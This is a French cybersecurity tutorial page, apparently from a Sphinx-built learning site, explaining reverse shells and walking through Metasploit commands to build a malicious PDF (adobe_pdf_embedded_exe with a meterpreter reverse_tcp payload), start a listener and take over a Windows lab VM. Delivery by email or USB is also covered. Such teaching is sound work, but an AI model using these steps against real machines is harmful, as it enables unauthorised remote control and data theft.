@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="fr" >
+<head>
+  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>1. Reverse Shell &mdash; Documentation cybersec-du-dimanche 0.0</title>
+      <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script data-url_root="../" id="documentation_options" src="../_static/documentation_options.js"></script>
+        <script src="../_static/jquery.js"></script>
+        <script src="../_static/underscore.js"></script>
+        <script src="../_static/_sphinx_javascript_frameworks_compat.js"></script>
+        <script src="../_static/doctools.js"></script>
+        <script src="../_static/translations.js"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Recherche" href="../search.html" />
+    <link rel="next" title="2. Virus Encoders" href="../virusencoders/virusencoders.html" />
+    <link rel="prev" title="1. Nikto" href="../nikto/nikto.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+            <a href="../index.html" class="icon icon-home"> cybersec-du-dimanche
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Rechercher docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Stéganographie</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../exiftool/exif.html">1. Exiftool</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Brute Force</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../john-the-ripper/john.html">1. John the Ripper</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Reconnaissance</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../nikto/nikto.html">1. Nikto</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Exploitation de failles</span></p>
+<ul class="current">
+<li class="toctree-l1 current"><a class="current reference internal" href="#">1. Reverse Shell</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#cours">1.1. Cours</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#quest-ce-quun-reverse-shell">1.1.1. Qu’est ce qu’un reverse shell ?</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#comment-cela-fonctionne-t-il">1.1.2. Comment cela fonctionne-t-il ?</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#et-dans-la-pratique-comment-on-fait-metasploit">1.1.3. Et dans la pratique… Comment on fait ? (Metasploit)</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#tutoriel-prendre-le-controle-dune-machine-windows-avec-un-fichier-pdf">1.2. Tutoriel : Prendre le contrôle d’une machine windows avec un fichier pdf</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#etape-1-creer-et-recuperer-le-pdf-malicieux">1.2.1. Étape 1 : Créer et récupérer le pdf malicieux</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#etape-2-activer-le-listener">1.2.2. ÉTAPE 2 : Activer le listener</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#etape-3-envoyer-le-fichier">1.2.3. ÉTAPE 3 : Envoyer le fichier</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#etape-4-ouvrir-le-fichier">1.2.4. ÉTAPE 4 : Ouvrir le fichier</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../virusencoders/virusencoders.html">2. Virus Encoders</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">cybersec-du-dimanche</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home"></a> &raquo;</li>
+      <li><span class="section-number">1. </span>Reverse Shell</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../_sources/reverse-shell/reverse.md.txt" rel="nofollow"> Afficher la source de la page</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="reverse-shell">
+<h1><span class="section-number">1. </span>Reverse Shell<a class="headerlink" href="#reverse-shell" title="Lien permanent vers cette rubrique"></a></h1>
+<section id="cours">
+<h2><span class="section-number">1.1. </span>Cours<a class="headerlink" href="#cours" title="Lien permanent vers cette rubrique"></a></h2>
+<p>Avant de parler de reverse shell, il faudrait tout d’abord rappeler ce qu’est un shell.
+Un shell est une couche logicielle qui fournit l’interface utilisateur du système d’exploitation. ( <a class="reference external" href="https://fr.wikipedia.org/wiki/Interface_syst%C3%A8me">wikipedia</a> )
+Différents shells existent : CMD, sh, bash, Powershell,…</p>
+<p>Une autre notion avant de comprendre ce qu’est un reverse shell est qu’est-ce qu’un port ?
+Un port informatique du point de vue logiciel est un système permettant aux ordinateurs de recevoir ou d’émettre des informations. ( <a class="reference external" href="https://fr.wikipedia.org/wiki/Port_informatique#:~:text=En%20informatique%2C%20port%20informatique%20ou,qui%20d%C3%A9signe%20un%20portage%20informatique.">wikipedia</a> )</p>
+<section id="quest-ce-quun-reverse-shell">
+<h3><span class="section-number">1.1.1. </span>Qu’est ce qu’un reverse shell ?<a class="headerlink" href="#quest-ce-quun-reverse-shell" title="Lien permanent vers cette rubrique"></a></h3>
+<p>Pour dire ça simplement, c’est lorsqu’un ordinateur se connecte à un autre ordinateur mais que l’ordinateur initiateur transmet son shell à la destination. Ainsi, ce type d’attaque donne à l’attaquant un shell interactif sur une machine.</p>
+</section>
+<section id="comment-cela-fonctionne-t-il">
+<h3><span class="section-number">1.1.2. </span>Comment cela fonctionne-t-il ?<a class="headerlink" href="#comment-cela-fonctionne-t-il" title="Lien permanent vers cette rubrique"></a></h3>
+<p>Vous n’êtes pas sans savoir que votre routeur vous protège d’un grand nombre de menaces qui pourraient venir de l’extérieur grâce à un firewall. En effet ce dernier n’accepte que des requêtes vers le port 80 et 443 de l’extérieur pour le http et le https. Toutes les autres sont bloquées. Cependant, toutes les requêtes et connexions sortantes sont autorisées sur n’importe quel port car l’ordinateur du réseau est considéré comme une machine de confiance. Cela permet à un attaquant de passer outre le firewall mit en place par le routeur.</p>
+<p>L’attaque commence avec une machine qui écoute sur un port (il s’agit de la machine de l’attaquant). Ensuite, la machine victime exécutera une commande qui la connectera à la machine attaquante et lui transmettra sa session.</p>
+<p>Peut-être vous demanderez vous pourquoi la machine victime voudrait à un moment donné exécuter cette commande… Cela peut être utile dans le domaine professionnel ou personnel si vous avez un ordinateur distant que vous voulez utiliser pour telle ou telle raison depuis un autre ordinateur, cela est possible. Dans le cas d’une attaque la commande pourra s’exécuter suite au téléchargement d’un fichier exécutable ou d’un fichier pdf ouvert avec un visionneur de pdf qui n’a pas été mis à jour.</p>
+</section>
+<section id="et-dans-la-pratique-comment-on-fait-metasploit">
+<h3><span class="section-number">1.1.3. </span>Et dans la pratique… Comment on fait ? (Metasploit)<a class="headerlink" href="#et-dans-la-pratique-comment-on-fait-metasploit" title="Lien permanent vers cette rubrique"></a></h3>
+<p>Pour commencer, un attaquant va créer ou télécharger un payload qu’il pourra envoyer à sa victime. Un payload est un fichier qui va exécuter du code malveillant, et dans notre cas ouvrir une connexion entre l’attaquant et la victime.</p>
+<p>Le module <code class="docutils literal notranslate"><span class="pre">exploit/windows/fileformat/adobe_pdf_embedded_exe</span></code> dans Metasploit nous permet de créer un payload pdf contenant un fichier exe dans son en-tête qui sera exécuté à l’ouverture du pdf. Il faudra configurer LHOST et LPORT comme l’adresse et le port de l’attaquant ou d’un serveur auquel les deux ordinateurs peuvent se connecter.</p>
+<p>Une fois le payload préparé, il suffit de l’envoyer à la victime. Toutes les techniques sont possibles (email, lien, clé usb,…)</p>
+<p>Désormais, il faut mettre en place le “listener” pour écouter et attendre une connexion sur le port spécifié dans LPORT lors de la création du payload.
+Le module <code class="docutils literal notranslate"><span class="pre">exploit/multi/handler</span></code> fonctionne très bien. Il faut ensuite préparer l’écoute en faisant : <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">payload</span> <span class="pre">windows/meterpreter/reverse_tcp</span></code> et en renseignant le LHOST et LPORT du payload pour dire à metasploit que nous avons un payload utilisant le protocole tcp et que nous allons ouvrir un meterpreter s’il y a une connexion d’une machine victime. Le meterpreter est un shell interactif qui permet à l’attaquant de faire un grand nombre de choses, upload/download de fichiers, stream de webcam, voir l’écran, créer des fichiers, ouvrir des pages web,…
+Il faudra ensuite taper la commande exploit pour que la machine se mette sur écoute.</p>
+<p>A partir de là, il suffit d’attendre que la victime ouvre le fichier malveillant qu’elle a téléchargé et l’attaquant aura un accès total à la machine.</p>
+</section>
+</section>
+<section id="tutoriel-prendre-le-controle-dune-machine-windows-avec-un-fichier-pdf">
+<h2><span class="section-number">1.2. </span>Tutoriel : Prendre le contrôle d’une machine windows avec un fichier pdf<a class="headerlink" href="#tutoriel-prendre-le-controle-dune-machine-windows-avec-un-fichier-pdf" title="Lien permanent vers cette rubrique"></a></h2>
+<p>Avant de commencer ce tutoriel, je vous conseillerai d’aller voir le cours sur le reverse shell pour bien comprendre les différentes étapes. Si vous avez lu le cours, je vous conseille maintenant d’aller commencer à télécharger la machine virtuelle que vous pourrez importer dans virtualbox en cliquant sur : <a class="reference external" href="https://mega.nz/file/YbEHwDJa#ky-4v_EFZCSYkLJLwulOvQXYNAbfivyp73gFinxZoDk">télécharger la Machine Virtuelle</a>{:target= »_blank »}</p>
+<section id="etape-1-creer-et-recuperer-le-pdf-malicieux">
+<h3><span class="section-number">1.2.1. </span>Étape 1 : Créer et récupérer le pdf malicieux<a class="headerlink" href="#etape-1-creer-et-recuperer-le-pdf-malicieux" title="Lien permanent vers cette rubrique"></a></h3>
+<p>Métasploit propose un grand nombre de payloads divers et variés. En tapant les bonnes recherches, il sera possible de trouver facilement celui qui nous intéresse.
+Tapez la commande <code class="docutils literal notranslate"><span class="pre">msfconsole</span></code> pour démarrer métasploit.
+Ensuite il faut chercher le payload.
+Tapez <code class="docutils literal notranslate"><span class="pre">search</span> <span class="pre">windows</span> <span class="pre">fileformat</span> <span class="pre">pdf</span></code>. Vous aurez un résultat comme ci dessous :</p>
+<p><img alt="image search" src="reverse-shell/images/search_msfconsole.png" /></p>
+<p>Plusieurs modules répondent à notre recherche, mais peu d’entre eux sont classés comme excellents. Nous allons donc prendre le numéro 6.
+Pour l’utiliser tapez <code class="docutils literal notranslate"><span class="pre">use</span> <span class="pre">exploit/windows/fileformat/adobe_pdf_embedded_exe</span></code>
+Nous allons vouloir configurer un payload qui nous fera une connexion vers notre machine et qui ouvrira une session meterpreter.
+Ainsi, tapons la commande : <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">payload</span> <span class="pre">windows/meterpreter/reverse_tcp</span></code></p>
+<p>Pour voir les options actuelles du payload, tapez : <code class="docutils literal notranslate"><span class="pre">show</span> <span class="pre">options</span></code>
+<img alt="image options" src="reverse-shell/images/show_options.png" /></p>
+<p>Vous devriez avoir quelque chose comme cela, peut être qu’une adresse par défaut ou qu’un port par défaut à été renseigné pour LHOST et LPORT.
+Nous allons configurer ce payload. Il faut commencer par renseigner les valeurs de LHOST et LPORT.
+Pour cela tapez <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">LHOST</span> <span class="pre">x.x.x.x</span></code> en remplaçant les x par les valeurs de l’adresse ip de votre machine. Puis tapez <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">LPORT</span> <span class="pre">xxx</span></code> en remplaçant xxx par le port de votre choix (par exemple, <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">LPORT</span> <span class="pre">4444</span></code>).
+vous pouvez refaire un show options, vous devriez voir que les options ont été prises en compte.
+Vous pouvez ensuite modifier le nom de votre fichier pdf en tapant <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">FILENAME</span> <span class="pre">xxxx.pdf</span></code> en remplaçant xxxx par le nom que vous voulez donner.</p>
+<p>Quand tout est prêt, tapez exploit. Vous verrez ensuite que votre fichier a été créé et la console vous indique à la dernière ligne le chemin d’accès à ce fichier.</p>
+</section>
+<section id="etape-2-activer-le-listener">
+<h3><span class="section-number">1.2.2. </span>ÉTAPE 2 : Activer le listener<a class="headerlink" href="#etape-2-activer-le-listener" title="Lien permanent vers cette rubrique"></a></h3>
+<p>Pour activer le listener, il vous faudra taper la commande <code class="docutils literal notranslate"><span class="pre">use</span> <span class="pre">exploit/multi/handler</span></code>
+puis <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">payload</span> <span class="pre">windows/meterpreter/reverse_tcp</span></code>
+De même que précédemment, il vous faut renseigner LHOST et LPORT. Quand cela est fait, tapez exploit.</p>
+</section>
+<section id="etape-3-envoyer-le-fichier">
+<h3><span class="section-number">1.2.3. </span>ÉTAPE 3 : Envoyer le fichier<a class="headerlink" href="#etape-3-envoyer-le-fichier" title="Lien permanent vers cette rubrique"></a></h3>
+<p>Vous pouvez envoyer le fichier de toutes les manières possibles : par usb, par mail, en le mettant en ligne en ayant démarré un serveur apache,… et tout autre technique imaginable.</p>
+</section>
+<section id="etape-4-ouvrir-le-fichier">
+<h3><span class="section-number">1.2.4. </span>ÉTAPE 4 : Ouvrir le fichier<a class="headerlink" href="#etape-4-ouvrir-le-fichier" title="Lien permanent vers cette rubrique"></a></h3>
+<p>Le fichier est bien téléchargé sur la machine virtuelle.
+Avant de l’ouvrir, vérifiez bien que le listener est lancé. Vous devez voir cela :</p>
+<p><img alt="image listener" src="reverse-shell/images/listener.png" /></p>
+<p>avec votre adresse et votre port que vous avez renseigné.</p>
+<p>Si tout est prêt, ouvrez le pdf avec adobe reader 8 !</p>
+<p><img alt="image enregistrer" src="reverse-shell/images/enregistrer-template.png" /></p>
+<p>Enregistrez template.pdf s’il vous le demande.</p>
+<p><img alt="image open" src="reverse-shell/images/openpdf.png" /></p>
+<p>Cliquez sur open.</p>
+<p>Retournez voir votre listener… Une fenêtre meterpreter s’est lancée, une connexion a été faite entre votre machine et celle de la victime. Tapez <code class="docutils literal notranslate"><span class="pre">help</span></code> pour voir tout ce qu’il vous est possible de faire. Amusez-vous bien ! Félicitations !</p>
+</section>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Pied de page">
+        <a href="../nikto/nikto.html" class="btn btn-neutral float-left" title="1. Nikto" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Précédent</a>
+        <a href="../virusencoders/virusencoders.html" class="btn btn-neutral float-right" title="2. Virus Encoders" accesskey="n" rel="next">Suivant <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2022, Tanguy BRON.</p>
+  </div>
+
+  Compilé avec <a href="https://www.sphinx-doc.org/">Sphinx</a> en utilisant un
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">thème</a>
+    fourni par <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
